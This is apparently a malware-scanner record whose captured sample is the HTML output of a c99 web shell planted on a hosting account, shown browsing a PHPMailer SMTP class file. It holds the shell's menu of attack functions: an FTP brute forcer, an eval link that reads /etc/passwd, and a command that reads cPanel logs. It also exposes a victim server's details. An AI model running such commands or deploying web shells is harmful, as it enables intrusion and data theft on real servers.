{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "call": "May call a DLL using Excel 4 Macros",
            "command": "May run PowerShell commands",
            "mkdir": "May create a directory",
            "run": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac",
            "windows": "May enumerate application windows"
        },
        "macro": "GIF89;a\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fhome%2F&sort=0a\"><b>home/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2F&sort=0a\"><b>chsclair/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2F&sort=0a\"><b>public_html/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F&sort=0a\"><b>classes/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=green>drwxr-xr-x</font></b><br><b>Free 240.56 GB of 389.31 GB (61.79%)</b><br><b>Your ip: <a href=http://87.177.159.26>87.177.159.26</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[php]&nbsp;class.smtp.php (32.74 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=green>-rw-r--r--</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=class.smtp.php&ft=info&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[hex]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=info&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=html&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=html&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=txt&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[txt]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=txt&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=code&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><font color=green>[Code]</font></a> (<a href=\"?act=f&f=class.smtp.php&ft=code&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=phpsess&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b><u>[Session]</u></b></a> (<a href=\"?act=f&f=class.smtp.php&ft=phpsess&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=exe&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=exe&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=sdb&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=sdb&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=img&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=img&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=ini&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=ini&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=download&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=download&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=notepad&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=notepad&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=class.smtp.php&ft=edit&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>[change]</b></a> (<a href=\"?act=f&f=class.smtp.php&ft=edit&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><pre><?php\n////////////////////////////////////////////////////\n// SMTP - PHP SMTP class\n//\n// Version 1.02\n//\n// Define an SMTP class that can be used to connect\n// and communicate with any SMTP server. It implements\n// all the SMTP functions defined in RFC821 except TURN.\n//\n// Author: Chris Ryan\n//\n// License: LGPL, see LICENSE\n////////////////////////////////////////////////////\n\n/**\n * SMTP is rfc 821 compliant and implements all the rfc 821 SMTP\n * commands except TURN which will always return a not implemented\n * error. SMTP also provides some utility methods for sending mail\n * to an SMTP server.\n * @package PHPMailer\n * @author Chris Ryan\n */\nclass SMTP\n{\n    /**\n     *  SMTP server port\n     *  @var int\n     */\n    var $SMTP_PORT = 25;\n    \n    /**\n     *  SMTP reply line ending\n     *  @var string\n     */\n    var $CRLF = \"\\r\\n\";\n    \n    /**\n     *  Sets whether debugging is turned on\n     *  @var bool\n     */\n    var $do_debug;       # the level of debug to perform\n\n    /**#@+\n     * @access private\n     */\n    var $smtp_conn;      # the socket to the server\n    var $error;          # error if any on the last call\n    var $helo_rply;      # the reply the server sent to us for HELO\n    /**#@-*/\n\n    /**\n     * Initialize the class so that the data is in a known state.\n     * @access public\n     * @return void\n     */\n    function SMTP() {\n        $this->smtp_conn = 0;\n        $this->error = null;\n        $this->helo_rply = null;\n\n        $this->do_debug = 0;\n    }\n\n    /*************************************************************\n     *                    CONNECTION FUNCTIONS                  *\n     ***********************************************************/\n\n    /**\n     * Connect to the server specified on the port specified.\n     * If the port is not specified use the default SMTP_PORT.\n     * If tval is specified then a connection will try and be\n     * established with the server for that number of seconds.\n     * If tval is not specified the default is 30 seconds to\n     * try on the connection.\n     *\n     * SMTP CODE SUCCESS: 220\n     * SMTP CODE FAILURE: 421\n     * @access public\n     * @return bool\n     */\n    function Connect($host,$port=0,$tval=30) {\n        # set the error val to null so there is no confusion\n        $this->error = null;\n\n        # make sure we are __not__ connected\n        if($this->connected()) {\n            # ok we are connected! what should we do?\n            # for now we will just give an error saying we\n            # are already connected\n            $this->error =\n                array(\"error\" => \"Already connected to a server\");\n            return false;\n        }\n\n        if(empty($port)) {\n            $port = $this->SMTP_PORT;\n        }\n\n        #connect to the smtp server\n        $this->smtp_conn = fsockopen($host,    # the host of the server\n                                     $port,    # the port to use\n                                     $errno,   # error number if any\n                                     $errstr,  # error message if any\n                                     $tval);   # give up after ? secs\n        # verify we connected properly\n        if(empty($this->smtp_conn)) {\n            $this->error = array(\"error\" => \"Failed to connect to server\",\n                                 \"errno\" => $errno,\n                                 \"errstr\" => $errstr);\n            if($this->do_debug >= 1) {\n                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .\n                         \": $errstr ($errno)\" . $this->CRLF;\n            }\n            return false;\n        }\n\n        # sometimes the SMTP server takes a little longer to respond\n        # so we will give it a longer timeout for the first read\n        // Windows still does not have support for this timeout function\n        if(substr(PHP_OS, 0, 3) != \"WIN\")\n           socket_set_timeout($this->smtp_conn, $tval, 0);\n\n        # get any announcement stuff\n        $announce = $this->get_lines();\n\n        # set the timeout  of any socket functions at 1/10 of a second\n        //if(function_exists(\"socket_set_timeout\"))\n        //   socket_set_timeout($this->smtp_conn, 0, 100000);\n\n        if($this->do_debug >= 2) {\n            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $announce;\n        }\n\n        return true;\n    }\n\n    /**\n     * Performs SMTP authentication.  Must be run after running the\n     * Hello() method.  Returns true if successfully authenticated.\n     * @access public\n     * @return bool\n     */\n    function Authenticate($username, $password) {\n        // Start authentication\n        fputs($this->smtp_conn,\"AUTH LOGIN\" . $this->CRLF);\n\n        $rply = $this->get_lines();\n        $code = substr($rply,0,3);\n\n        if($code != 334) {\n            $this->error =\n                array(\"error\" => \"AUTH not accepted from server\",\n                      \"smtp_code\" => $code,\n                      \"smtp_msg\" => substr($rply,4));\n            if($this->do_debug >= 1) {\n                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .\n                         \": \" . $rply . $this->CRLF;\n            }\n            return false;\n        }\n\n        // Send encoded username\n        fputs($this->smtp_conn, base64_encode($username) . $this->CRLF);\n\n        $rply = $this->get_lines();\n        $code = substr($rply,0,3);\n\n        if($code != 334) {\n            $this->error =\n                array(\"error\" => \"Username not accepted from server\",\n                      \"smtp_code\" => $code,\n                      \"smtp_msg\" => substr($rply,4));\n            if($this->do_debug >= 1) {\n                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .\n                         \": \" . $rply . $this->CRLF;\n            }\n            return false;\n        }\n\n        // Send encoded password\n        fputs($this->smtp_conn, base64_encode($password) . $this->CRLF);\n\n        $rply = $this->get_lines();\n        $code = substr($rply,0,3);\n\n        if($code != 235) {\n            $this->error =\n                array(\"error\" => \"Password not accepted from server\",\n                      \"smtp_code\" => $code,\n                      \"smtp_msg\" => substr($rply,4));\n            if($this->do_debug >= 1) {\n                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .\n                         \": \" . $rply . $this->CRLF;\n            }\n            return false;\n        }\n\n        return true;\n    }\n\n    /**\n     * Returns true if connected to a server otherwise false\n     * @access private\n     * @return bool\n     */\n    function Connected() {\n        if(!empty($this->smtp_conn)) {\n            $sock_status = socket_get_status($this->smtp_conn);\n            if($sock_status[\"eof\"]) {\n                # hmm this is an odd situation... the socket is\n                # valid but we aren't connected anymore\n                if($this->do_debug >= 1) {\n                    echo \"SMTP -> NOTICE:\" . $this->CRLF .\n                         \"EOF caught while checking if connected\";\n                }\n                $this->Close();\n                return false;\n            }\n            return true; # everything looks good\n        }\n        return false;\n    }\n\n    /**\n     * Closes the socket and cleans up the state of the class.\n     * It is not considered good to use this function without\n     * first trying to use QUIT.\n     * @access public\n     * @return void\n     */\n    function Close() {\n        $this->error = null; # so there is no confusion\n        $this->helo_rply = null;\n        if(!empty($this->smtp_conn)) {\n            # close the connection and cleanup\n            fclose($this->smtp_conn);\n            $this->smtp_conn = 0;\n        }\n    }\n\n\n    /***************************************************************\n     *                        SMTP COMMANDS                       *\n     *************************************************************/\n\n    /**\n     * Issues a data command and sends the msg_data to the server\n     * finializing the mail transaction. $msg_data is the message\n     * that is to be send with the headers. Each header needs to be\n     * on a single line followed by a <CRLF> with the message headers\n     * and the message body being seperated by and additional <CRLF>.\n     *\n     * Implements rfc 821: DATA <CRLF>\n     *\n     * SMTP CODE INTERMEDIATE: 354\n     *     [data]\n     *     <CRLF>.<CRLF>\n     *     SMTP CODE SUCCESS: 250\n     *     SMTP CODE FAILURE: 552,554,451,452\n     * SMTP CODE FAILURE: 451,554\n     * SMTP CODE ERROR  : 500,501,503,421\n     * @access public\n     * @return bool\n     */\n    function Data($msg_data) {\n        $this->error = null; # so no confusion is caused\n\n        if(!$this->connected()) {\n            $this->error = array(\n                    \"error\" => \"Called Data() without being connected\");\n            return false;\n        }\n\n        fputs($this->smtp_conn,\"DATA\" . $this->CRLF);\n\n        $rply = $this->get_lines();\n        $code = substr($rply,0,3);\n\n        if($this->do_debug >= 2) {\n            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $rply;\n        }\n\n        if($code != 354) {\n            $this->error =\n                array(\"error\" => \"DATA command not accepted from server\",\n                      \"smtp_code\" => $code,\n                      \"smtp_msg\" => substr($rply,4));\n            if($this->do_debug >= 1) {\n                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .\n                         \": \" . $rply . $this->CRLF;\n            }\n            return false;\n        }\n\n        # the server is ready to accept data!\n        # according to rfc 821 we should not send more than 1000\n        # including the CRLF\n        # characters on a single line so we will break the data up\n        # into lines by \\r and/or \\n then if needed we will break\n        # each of those into smaller lines to fit within the limit.\n        # in addition we will be looking for lines that start with\n        # a period '.' and append and additional period '.' to that\n        # line. NOTE: this does not count towards are limit.\n\n        # normalize the line breaks so we know the explode works\n        $msg_data = str_replace(\"\\r\\n\",\"\\n\",$msg_data);\n        $msg_data = str_replace(\"\\r\",\"\\n\",$msg_data);\n        $lines = explode(\"\\n\",$msg_data);\n\n        # we need to find a good way to determine is headers are\n        # in the msg_data or if it is a straight msg body\n        # currently I'm assuming rfc 822 definitions of msg headers\n        # and if the first field of the first line (':' sperated)\n        # does not contain a space then it _should_ be a header\n        # and we can process all lines before a blank \"\" line as\n        # headers.\n        $field = substr($lines[0],0,strpos($lines[0],\":\"));\n        $in_headers = false;\n        if(!empty($field) && !strstr($field,\" \")) {\n            $in_headers = true;\n        }\n\n        $max_line_length = 998; # used below; set here for ease in change\n\n        while(list(,$line) = @each($lines)) {\n            $lines_out = null;\n            if($line == \"\" && $in_headers) {\n                $in_headers = false;\n            }\n            # ok we need to break this line up into several\n            # smaller lines\n            while(strlen($line) > $max_line_length) {\n                $pos = strrpos(substr($line,0,$max_line_length),\" \");\n\n                # Patch to fix DOS attack\n                if(!$pos) {\n                    $pos = $max_line_length - 1;\n                }\n\n                $lines_out[] = substr($line,0,$pos);\n                $line = substr($line,$pos + 1);\n                # if we are processing headers we need to\n                # add a LWSP-char to the front of the new line\n                # rfc 822 on long msg headers\n                if($in_headers) {\n                    $line = \"\\t\" . $line;\n                }\n            }\n            $lines_out[] = $line;\n\n            # now send the lines to the server\n            while(list(,$line_out) = @each($lines_out)) {\n                if(strlen($line_out) > 0)\n                {\n                    if(substr($line_out, 0, 1) == \".\") {\n                        $line_out = \".\" . $line_out;\n                    }\n                }\n                fputs($this->smtp_conn,$line_out . $this->CRLF);\n            }\n        }\n\n        # ok all the message data has been sent so lets get this\n        # over with aleady\n        fputs($this->smtp_conn, $this->CRLF . \".\" . $this->CRLF);\n\n        $rply = $this->get_lines();\n        $code = substr($rply,0,3);\n\n        if($this->do_debug >= 2) {\n            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $rply;\n        }\n\n        if($code != 250) {\n            $this->error =\n                array(\"error\" => \"DATA not accepted from server\",\n                      \"smtp_code\" => $code,\n                      \"smtp_msg\" => substr($rply,4));\n            if($this->do_debug >= 1) {\n                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .\n                         \": \" . $rply . $this->CRLF;\n            }\n            return false;\n        }\n        return true;\n    }\n\n    /**\n     * Expand takes the name and asks the server to list all the\n     * people who are members of the _list_. Expand will return\n     * back and array of the result or false if an error occurs.\n     * Each value in the array returned has the format of:\n     *     [ <full-name> <sp> ] <path>\n     * The definition of <path> is defined in rfc 821\n     *\n     * Implements rfc 821: EXPN <SP> <string> <CRLF>\n     *\n     * SMTP CODE SUCCESS: 250\n     * SMTP CODE FAILURE: 550\n     * SMTP CODE ERROR  : 500,501,502,504,421\n     * @access public\n     * @return string array\n     */\n    function Expand($name) {\n        $this->error = null; # so no confusion is caused\n\n        if(!$this->connected()) {\n            $this->error = array(\n                    \"error\" => \"Called Expand() without being connected\");\n            return false;\n        }\n\n        fputs($this->smtp_conn,\"EXPN \" . $name . $this->CRLF);\n\n        $rply = $this->get_lines();\n        $code = substr($rply,0,3);\n\n        if($this->do_debug >= 2) {\n            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $rply;\n        }\n\n        if($code != 250) {\n            $this->error =\n                array(\"error\" => \"EXPN not accepted from server\",\n                      \"smtp_code\" => $code,\n                      \"smtp_msg\" => substr($rply,4));\n            if($this->do_debug >= 1) {\n                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .\n                         \": \" . $rply . $this->CRLF;\n            }\n            return false;\n        }\n\n        # parse the reply and place in our array to return to user\n        $entries = explode($this->CRLF,$rply);\n        while(list(,$l) = @each($entries)) {\n            $list[] = substr($l,4);\n        }\n\n        return $list;\n    }\n\n    /**\n     * Sends the HELO command to the smtp server.\n     * This makes sure that we and the server are in\n     * the same known state.\n     *\n     * Implements from rfc 821: HELO <SP> <domain> <CRLF>\n     *\n     * SMTP CODE SUCCESS: 250\n     * SMTP CODE ERROR  : 500, 501, 504, 421\n     * @access public\n     * @return bool\n     */\n    function Hello($host=\"\") {\n        $this->error = null; # so no confusion is caused\n\n        if(!$this->connected()) {\n            $this->error = array(\n                    \"error\" => \"Called Hello() without being connected\");\n            return false;\n        }\n\n        # if a hostname for the HELO wasn't specified determine\n        # a suitable one to send\n        if(empty($host)) {\n            # we need to determine some sort of appopiate default\n            # to send to the server\n            $host = \"localhost\";\n        }\n\n        // Send extended hello first (RFC 2821)\n        if(!$this->SendHello(\"EHLO\", $host))\n        {\n            if(!$this->SendHello(\"HELO\", $host))\n                return false;\n        }\n\n        return true;\n    }\n\n    /**\n     * Sends a HELO/EHLO command.\n     * @access private\n     * @return bool\n     */\n    function SendHello($hello, $host) {\n        fputs($this->smtp_conn, $hello . \" \" . $host . $this->CRLF);\n\n        $rply = $this->get_lines();\n        $code = substr($rply,0,3);\n\n        if($this->do_debug >= 2) {\n            echo \"SMTP -> FROM SERVER: \" . $this->CRLF . $rply;\n        }\n\n        if($code != 250) {\n            $this->error =\n                array(\"error\" => $hello . \" not accepted from server\",\n                      \"smtp_code\" => $code,\n                      \"smtp_msg\" => substr($rply,4));\n            if($this->do_debug >= 1) {\n                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .\n                         \": \" . $rply . $this->CRLF;\n            }\n            return false;\n        }\n\n        $this->helo_rply = $rply;\n        \n        return true;\n    }\n\n    /**\n     * Gets help information on the keyword specified. If the keyword\n     * is not specified then returns generic help, ussually contianing\n     * A list of keywords that help is available on. This function\n     * returns the results back to the user. It is up to the user to\n     * handle the returned data. If an error occurs then false is\n     * returned with $this->error set appropiately.\n     *\n     * Implements rfc 821: HELP [ <SP> <string> ] <CRLF>\n     *\n     * SMTP CODE SUCCESS: 211,214\n     * SMTP CODE ERROR  : 500,501,502,504,421\n     * @access public\n     * @return string\n     */\n    function Help($keyword=\"\") {\n        $this->error = null; # to avoid confusion\n\n        if(!$this->connected()) {\n            $this->error = array(\n                    \"error\" => \"Called Help() without being connected\");\n            return false;\n        }\n\n        $extra = \"\";\n        if(!empty($keyword)) {\n            $extra = \" \" . $keyword;\n        }\n\n        fputs($this->smtp_conn,\"HELP\" . $extra . $this->CRLF);\n\n        $rply = $this->get_lines();\n        $code = substr($rply,0,3);\n\n        if($this->do_debug >= 2) {\n            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $rply;\n        }\n\n        if($code != 211 && $code != 214) {\n            $this->error =\n                array(\"error\" => \"HELP not accepted from server\",\n                      \"smtp_code\" => $code,\n                      \"smtp_msg\" => substr($rply,4));\n            if($this->do_debug >= 1) {\n                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .\n                         \": \" . $rply . $this->CRLF;\n            }\n            return false;\n        }\n\n        return $rply;\n    }\n\n    /**\n     * Starts a mail transaction from the email address specified in\n     * $from. Returns true if successful or false otherwise. If True\n     * the mail transaction is started and then one or more Recipient\n     * commands may be called followed by a Data command.\n     *\n     * Implements rfc 821: MAIL <SP> FROM:<reverse-path> <CRLF>\n     *\n     * SMTP CODE SUCCESS: 250\n     * SMTP CODE SUCCESS: 552,451,452\n     * SMTP CODE SUCCESS: 500,501,421\n     * @access public\n     * @return bool\n     */\n    function Mail($from) {\n        $this->error = null; # so no confusion is caused\n\n        if(!$this->connected()) {\n            $this->error = array(\n                    \"error\" => \"Called Mail() without being connected\");\n            return false;\n        }\n\n        fputs($this->smtp_conn,\"MAIL FROM:<\" . $from . \">\" . $this->CRLF);\n\n        $rply = $this->get_lines();\n        $code = substr($rply,0,3);\n\n        if($this->do_debug >= 2) {\n            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $rply;\n        }\n\n        if($code != 250) {\n            $this->error =\n                array(\"error\" => \"MAIL not accepted from server\",\n                      \"smtp_code\" => $code,\n                      \"smtp_msg\" => substr($rply,4));\n            if($this->do_debug >= 1) {\n                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .\n                         \": \" . $rply . $this->CRLF;\n            }\n            return false;\n        }\n        return true;\n    }\n\n    /**\n     * Sends the command NOOP to the SMTP server.\n     *\n     * Implements from rfc 821: NOOP <CRLF>\n     *\n     * SMTP CODE SUCCESS: 250\n     * SMTP CODE ERROR  : 500, 421\n     * @access public\n     * @return bool\n     */\n    function Noop() {\n        $this->error = null; # so no confusion is caused\n\n        if(!$this->connected()) {\n            $this->error = array(\n                    \"error\" => \"Called Noop() without being connected\");\n            return false;\n        }\n\n        fputs($this->smtp_conn,\"NOOP\" . $this->CRLF);\n\n        $rply = $this->get_lines();\n        $code = substr($rply,0,3);\n\n        if($this->do_debug >= 2) {\n            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $rply;\n        }\n\n        if($code != 250) {\n            $this->error =\n                array(\"error\" => \"NOOP not accepted from server\",\n                      \"smtp_code\" => $code,\n                      \"smtp_msg\" => substr($rply,4));\n            if($this->do_debug >= 1) {\n                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .\n                         \": \" . $rply . $this->CRLF;\n            }\n            return false;\n        }\n        return true;\n    }\n\n    /**\n     * Sends the quit command to the server and then closes the socket\n     * if there is no error or the $close_on_error argument is true.\n     *\n     * Implements from rfc 821: QUIT <CRLF>\n     *\n     * SMTP CODE SUCCESS: 221\n     * SMTP CODE ERROR  : 500\n     * @access public\n     * @return bool\n     */\n    function Quit($close_on_error=true) {\n        $this->error = null; # so there is no confusion\n\n        if(!$this->connected()) {\n            $this->error = array(\n                    \"error\" => \"Called Quit() without being connected\");\n            return false;\n        }\n\n        # send the quit command to the server\n        fputs($this->smtp_conn,\"quit\" . $this->CRLF);\n\n        # get any good-bye messages\n        $byemsg = $this->get_lines();\n\n        if($this->do_debug >= 2) {\n            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $byemsg;\n        }\n\n        $rval = true;\n        $e = null;\n\n        $code = substr($byemsg,0,3);\n        if($code != 221) {\n            # use e as a tmp var cause Close will overwrite $this->error\n            $e = array(\"error\" => \"SMTP server rejected quit command\",\n                       \"smtp_code\" => $code,\n                       \"smtp_rply\" => substr($byemsg,4));\n            $rval = false;\n            if($this->do_debug >= 1) {\n                echo \"SMTP -> ERROR: \" . $e[\"error\"] . \": \" .\n                         $byemsg . $this->CRLF;\n            }\n        }\n\n        if(empty($e) <br>bool(false)\n</pre>\n</td></tr></table><a bookmark=\"minipanel\"><br><TABLE 